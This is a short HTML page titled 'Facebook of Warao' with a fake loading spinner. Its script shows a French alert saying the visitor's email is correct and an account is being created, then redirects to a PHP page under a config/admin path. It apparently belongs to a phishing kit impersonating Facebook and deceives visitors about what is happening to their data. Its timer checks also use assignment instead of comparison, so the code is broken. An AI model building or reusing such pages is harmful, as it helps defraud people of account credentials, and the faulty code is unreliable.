<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook of Warao</title>
</head>
<style>
  body {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
    background: #1b2227;
  }

  .loader {
    height: 9em;
    width: 9em;
    position: relative;
    justify-content: center;
    align-items: center;
  }

  .circle {
    position: absolute;
    height: 80%;
    width: 80%;
    border-radius: 50%;
    border-style: solid;
  }

  .white {
    border-width: 3px 3px 0 0;
    border-color: white white transparent transparent;
    animation: 1s rotate-white linear infinite;
  }

  .red {
    border-width: 0 0 3px 3px;
    border-color: transparent transparent red red;
    animation: 1s rotate-red linear infinite;
  }

  .orange {
    border-width: 0 3px 3px 0;
    border-color: transparent orange orange transparent;
    animation: 1s rotate-orange linear infinite;
  }

  .yellow {
    border-width: 3px 0 0 3px;
    border-color: yellow transparent transparent yellow;
    animation: 1s rotate-yellow linear infinite;
  }

  @keyframes rotate-white {
    from {
      transform: rotateX(45deg) rotateY(-35deg)rotateZ(0deg);
    }

    to {
      transform: rotateX(45deg) rotateY(-35deg)rotateZ(360deg);
    }
  }

  @keyframes rotate-red {
    from {
      transform: rotateX(45deg) rotateY(35deg) rotateZ(0deg);
    }

    to {
      transform: rotateX(45deg) rotateY(35deg)rotateZ(360deg);
    }
  }

  @keyframes rotate-orange {
    from {
      transform: rotateX(70deg) rotateZ(360deg);
    }

    to {
      transform: rotateX(70deg) rotateZ(0deg);
    }
  }

  @keyframes rotate-yellow {
    from {
      transform: rotateX(70deg) rotateZ(0deg);
    }

    to {
      transform: rotateX(70deg) rotateZ(360deg);
    }
  }
</style>

<body>
  <div class="loader">
    <div class="circle white"></div>
    <div class="circle red"></div>
    <div class="circle orange"></div>
    <div class="circle yellow"></div>
  </div>
  <script>
    let counter = 0;
    setInterval(() => {
      counter++;
      if (counter = 20) {
        alert("L'email entrer est correct😍😍 Un instant,Nous creont votre compte😉");
      }
      if (counter = 150) {
        window.location.href = '../config/admin/ask.php'
      }
    }, 7000)
  </script>
</body>

</html>